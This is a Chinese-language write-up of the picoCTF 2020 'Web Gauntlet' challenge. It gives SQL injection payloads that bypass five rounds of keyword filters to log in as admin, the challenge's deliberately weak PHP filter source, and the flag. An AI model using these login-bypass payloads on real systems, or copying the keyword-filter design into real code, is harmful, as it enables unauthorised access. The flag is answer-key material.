# picoCTF 2020

## web
### Web Gauntlet
> Can you beat the filters? Log in as admin
> http://jupiter.challenges.picoctf.org:19593/
> http://jupiter.challenges.picoctf.org:19593/filter.php
> hint:
> You are not allowed to login with valid credentials.
> Write down the injections you use in case you lose your progress.
> For some filters it may be hard to see the characters, always (always) look at the raw hex in the response.
> sqlite
> If your cookie keeps getting reset, try using a private browser window
* 從題意上可以看出要繞過 filter 頁面中所顯示的語法
* 第一關需要繞過 `or`
    * 要以 `admin` 登入
    * 加上是 sqlite
    * 不難推斷正確的 payload 是
        * `username : admin' -- `
        * `password : whatever`
* 第二關需要繞過 `or and like = --`
    * payload
        * `username : admin' /*`
        * `password : whatever`
* 第三關需要繞過 `or and = like > < --` 還有空格
    * payload
        * `username : admin'/*`
        * `password : whatever`
* 第四關需要繞過 `or and = like > < -- admin` 還有空格
* 比較麻煩的一點是他把 admin 過濾了
* 第一個想到的是兩字串相連起來的做法繞過 `||`
    * payload
        * `username : ad'||'min'/*`
        * `password : whatever`
* 第五關需要繞過 `or and = like > < -- union admin` 還有空格
* 看到 `union` 我震驚了，應該不需要那種東東吧 ... 
    * payload
        * `username : ad'||'min'/*`
        * `password : whatever`
* 做到第五關可以知道有一個萬用解，對這一題來說
    * `username : ad'||'min'/*`
    * `password : whatever`
* 解完五關可以拿到他的 php source code 
    ```php=
    <?php
    session_start();

    if (!isset($_SESSION["round"])) {
        $_SESSION["round"] = 1;
    }
    $round = $_SESSION["round"];
    $filter = array("");
    $view = ($_SERVER["PHP_SELF"] == "/filter.php");

    if ($round === 1) {
        $filter = array("or");
        if ($view) {
            echo "Round1: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 2) {
        $filter = array("or", "and", "like", "=", "--");
        if ($view) {
            echo "Round2: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 3) {
        $filter = array(" ", "or", "and", "=", "like", ">", "<", "--");
        // $filter = array("or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
        if ($view) {
            echo "Round3: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 4) {
        $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "admin");
        // $filter = array(" ", "/**/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
        if ($view) {
            echo "Round4: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round === 5) {
        $filter = array(" ", "or", "and", "=", "like", ">", "<", "--", "union", "admin");
        // $filter = array("0", "unhex", "char", "/*", "*/", "--", "or", "and", "=", "like", "union", "select", "insert", "delete", "if", "else", "true", "false", "admin");
        if ($view) {
            echo "Round5: ".implode(" ", $filter)."<br/>";
        }
    } else if ($round >= 6) {
        if ($view) {
            highlight_file("filter.php");
        }
    } else {
        $_SESSION["round"] = 1;
    }

    // picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}
    ?>
    ```
* flag : `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`
